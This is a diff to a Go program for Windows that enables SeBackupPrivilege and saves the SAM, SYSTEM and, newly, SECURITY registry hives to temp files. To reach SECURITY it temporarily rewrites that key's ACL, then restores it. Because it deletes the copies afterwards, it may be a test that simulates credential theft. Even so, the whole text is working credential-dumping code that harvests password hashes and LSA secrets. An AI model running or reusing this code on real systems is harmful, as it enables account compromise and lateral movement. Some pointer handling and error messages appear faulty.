@@ -3,6 +3,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"os"
 	"time"
@@ -13,14 +14,37 @@ import (
 )
 
 var (
-	ntdll                  = windows.NewLazyDLL("ntdll.dll")
-	procNtSaveKey          = ntdll.NewProc("NtSaveKey")
-	hives         []string = []string{"SAM", "SYSTEM"}
-	filenames     []string = []string{
+	ntdll         = windows.NewLazyDLL("ntdll.dll")
+	procNtSaveKey = ntdll.NewProc("NtSaveKey")
+
+	advapi32                      = windows.NewLazyDLL("Advapi32.dll")
+	procGetExplicitEntriesFromACL = advapi32.NewProc(
+		"GetExplicitEntriesFromAclW",
+	)
+	procGetNamedSecurityInfo = advapi32.NewProc(
+		"GetNamedSecurityInfoW",
+	)
+	procSetEntriesInACL = advapi32.NewProc(
+		"SetEntriesInAclW",
+	)
+	procSetNamedSecurityInfo = advapi32.NewProc(
+		"SetNamedSecurityInfoW",
+	)
+
+	hives     []string
+	filenames []string = []string{
 		"C:\\Windows\\Temp\\samcopy",
 		"C:\\Windows\\Temp\\syscopy",
+		"C:\\Windows\\Temp\\seccopy",
 	}
+
 	success bool = false
+
+	security = flag.Bool(
+		"security",
+		false,
+		"Enables the saving of SECURITY in addition to SAM/SYSTEM",
+	)
 )
 
 func getproctoken() (windows.Token, error) {
@@ -35,10 +59,10 @@ func getproctoken() (windows.Token, error) {
 	return token, err
 }
 
-func createnewstate(priv string, attributes uint32) (
-	*windows.Tokenprivileges,
-	[]byte,
-) {
+func createnewstate(
+	priv string,
+	attributes uint32,
+) (*windows.Tokenprivileges, []byte) {
 	var luid windows.LUID
 
 	// Get the LUID of the privilege
@@ -114,8 +138,7 @@ func enablepriv(priv string) {
 /*
 Function to disable a privilege for cleanup
 It's probably not needed, but leaving this in here
-in case it's needed for future use. Just uncomment
-it if you need it
+in case it's needed for future use
 */
 /*
 func disablepriv(priv string) {
@@ -129,7 +152,7 @@ func disablepriv(priv string) {
 	var newStateBuffer []byte
 	newState, newStateBuffer = createnewstate(
 		priv,
-		windows.SE_PRIVILEGE_REMOVED
+		windows.SE_PRIVILEGE_REMOVED,
 	)
 
 	err = adjusttokenprivs(token, newState, newStateBuffer)
@@ -138,6 +161,196 @@ func disablepriv(priv string) {
 	}
 }
 */
+
+// Function to give ourselves read permission to the SECURITY
+// hive so that we can save a copy of it
+func getsecreadpermission() []windows.EXPLICIT_ACCESS {
+	var newacl, oldacl windows.Handle
+	seckey := "MACHINE\\SECURITY"
+	var oldentries []windows.EXPLICIT_ACCESS = make(
+		[]windows.EXPLICIT_ACCESS,
+		1,
+	)
+	var entry []windows.EXPLICIT_ACCESS
+
+	// Uncomment the below if you would rather give the
+	// permission to the current user, rather than the
+	// local admins group
+	/*
+		CurrentUser, err := user.Current()
+		if err != nil {
+			fmt.Printf("[!] %s\n", err))
+			fmt.Println("[!] Exiting...")
+			os.Exit(1)
+		}
+	*/
+
+	// Comment next 3 lines if you want current user instead
+	var AdminGroupSidStr string = "S-1-5-32-544"
+	var AdminGroupSid *windows.SID
+
+	AdminGroupSid, _ = windows.StringToSid(AdminGroupSidStr)
+
+	var secDesc windows.Handle
+
+	fmt.Println("[+] " +
+		"Getting old SECURITY ACL so it can be restored later")
+	ret, _, err := procGetNamedSecurityInfo.Call(
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
+		uintptr(windows.SE_REGISTRY_KEY),
+		uintptr(windows.DACL_SECURITY_INFORMATION),
+		0,
+		0,
+		uintptr(unsafe.Pointer(&oldacl)),
+		0,
+		uintptr(unsafe.Pointer(&secDesc)),
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Println("[!] Couldn't backup old ACL, exiting...")
+		os.Exit(1)
+	}
+
+	defer windows.LocalFree(secDesc)
+
+	var countentries int
+	/*
+		Get the individual EXPLICIT_ACCESS entries from the
+		ACL, which we will need to restore the original ACL
+		To be sure of the number of entries, we will call
+		GetExplicitEntriesFromAcl twice - once to get the
+		count of entries so we can properly initialize the
+		old entries array, then a second time to actually
+		get the array of entries
+	*/
+	fmt.Println("[+] Getting EXPLICIT_ACCESS entries from old ACL")
+	ret, _, err = procGetExplicitEntriesFromACL.Call(
+		uintptr(oldacl),
+		uintptr(unsafe.Pointer(&countentries)),
+		uintptr(unsafe.Pointer(&oldentries)),
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Printf(
+			"[!] Try again with an array of size %d\n",
+			countentries,
+		)
+		fmt.Println("[!] Exiting...")
+		os.Exit(1)
+	}
+	oldentries = make([]windows.EXPLICIT_ACCESS, countentries)
+	ret, _, err = procGetExplicitEntriesFromACL.Call(
+		uintptr(oldacl),
+		uintptr(unsafe.Pointer(&countentries)),
+		uintptr(unsafe.Pointer(&oldentries)),
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Println("[!] Couldn't create ACL entries, exiting...")
+		os.Exit(1)
+	}
+
+	// Sometimes running this gets wonky, so we will print the
+	// access mask entries in case they're needed for debugging
+	fmt.Println("[+] Access mask values from EXPLICIT_ACCESS entries:")
+	for _, entry := range oldentries {
+		fmt.Printf("[+] Access Mask: %d\n", entry.AccessPermissions)
+	}
+
+	fmt.Println("" +
+		"[+] Creating a new EXPLICIT_ACCESS entry for READ access")
+	ea := windows.EXPLICIT_ACCESS{
+		AccessPermissions: windows.GENERIC_READ,
+		AccessMode:        windows.GRANT_ACCESS,
+		Inheritance:       windows.SUB_CONTAINERS_AND_OBJECTS_INHERIT,
+		Trustee: windows.TRUSTEE{
+			TrusteeForm: windows.TRUSTEE_IS_SID,
+			TrusteeType: windows.TRUSTEE_IS_GROUP,
+			// Change AdminGroupSid if using current user
+			TrusteeValue: windows.TrusteeValueFromSID(AdminGroupSid),
+		},
+	}
+	entry = []windows.EXPLICIT_ACCESS{ea}
+
+	fmt.Println("[+] Creating modified ACL")
+	ret, _, err = procSetEntriesInACL.Call(
+		uintptr(len(entry)),
+		uintptr(unsafe.Pointer(&entry[0])),
+		uintptr(oldacl),
+		uintptr(unsafe.Pointer(&newacl)),
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Println("[!} Couldn't create the ACL, exiting...]")
+		os.Exit(1)
+	}
+
+	defer windows.LocalFree(newacl)
+
+	fmt.Println("[+] Applying new ACL to SECURITY")
+	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
+	ret, _, err = procSetNamedSecurityInfo.Call(
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
+		uintptr(windows.SE_REGISTRY_KEY),
+		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
+		0,
+		0,
+		uintptr(newacl),
+		0,
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Println("[!} Couldn't apply the ACL, exiting...]")
+		os.Exit(1)
+	}
+
+	return oldentries
+}
+
+// Function to restore the original ACL of the SECURITY hive
+func revertsecpermissions(oldentries []windows.EXPLICIT_ACCESS) {
+	var newacl windows.Handle
+	seckey := "MACHINE\\SECURITY"
+
+	// The oldentries parameter should be an array of the
+	// EXPLICIT_ACCESS entries from the original ACL
+	// ret, _, err :=
+	procSetEntriesInACL.Call(
+		uintptr(len(oldentries)),
+		uintptr(unsafe.Pointer(&oldentries[0])),
+		0, // null for the old ACL, so it will create a new one
+		uintptr(unsafe.Pointer(&newacl)),
+	)
+	// Commenting this out because sometimes ret would get
+	// a non-zero even on success, and err would be "the
+	// operation completed successfully"
+	/*
+		if ret != 0 {
+			fmt.Printf("[!] %s\n", err)
+			os.Exit(1)
+		}
+	*/
+
+	defer windows.LocalFree(newacl)
+
+	fmt.Println("[+] Applying old ACL to SECURITY")
+	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
+	ret, _, err := procSetNamedSecurityInfo.Call(
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
+		uintptr(windows.SE_REGISTRY_KEY),
+		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
+		0,
+		0,
+		uintptr(newacl),
+		0,
+	)
+	if ret != 0 {
+		fmt.Printf("[!] %s\n", err)
+		fmt.Println("[!} Couldn't apply the old ACL...]")
+		fmt.Println("[!] You may have to manually fix it")
+
+	}
+}
 
 // Function to save a hive to a specified outfile
 func savehive(hive string, outfile string) {
@@ -162,7 +375,7 @@ func savehive(hive string, outfile string) {
 		os.Exit(1)
 	}
 
-	// the 4 passed as the fifth parameter is for OPEN_ALWAYS
+	// The 4 passed as the fifth parameter is for OPEN_ALWAYS
 	// from:
 	// https://learn.microsoft.com/
 	// en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
@@ -196,13 +409,31 @@ func savehive(hive string, outfile string) {
 }
 
 func execute() {
+	var oldentries []windows.EXPLICIT_ACCESS
+
 	fmt.Println("[+] Enabling SeBackupPrivilege")
 	enablepriv("SeBackupPrivilege")
 
-	fmt.Println("[+] Saving the SAM and SYSTEM hives")
+	if *security {
+		hives = []string{"SAM", "SYSTEM", "SECURITY"}
+		fmt.Println("[+] Giving ourselves READ access to the SECURITY hive.")
+		oldentries = getsecreadpermission()
+	} else {
+		hives = []string{"SAM", "SYSTEM"}
+	}
+
+	fmt.Println("[+] Saving the hives")
 	for i, h := range hives {
 		outfile := filenames[i]
 		savehive(h, outfile)
+	}
+
+	if *security {
+		// Restore the original ACL EXPLICIT_ACCESS entries
+		revertsecpermissions(oldentries)
+		defer windows.LocalFree(
+			(windows.Handle)(unsafe.Pointer(&oldentries)),
+		)
 	}
 
 	fmt.Println("[+] Waiting 3 seconds before checking files...")
@@ -220,6 +451,7 @@ func execute() {
 
 func cleanup() {
 	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
+	time.Sleep(10 * time.Second)
 	fmt.Println("[+] Cleaning up")
 
 	if success {
@@ -237,11 +469,11 @@ func cleanup() {
 	} else {
 		fmt.Println("[-] Nothing to clean up")
 	}
-
 	// disablepriv("SeBackupPrivilege")
 }
 
 func main() {
+	flag.Parse()
 	execute()
 	cleanup()
 	if success {
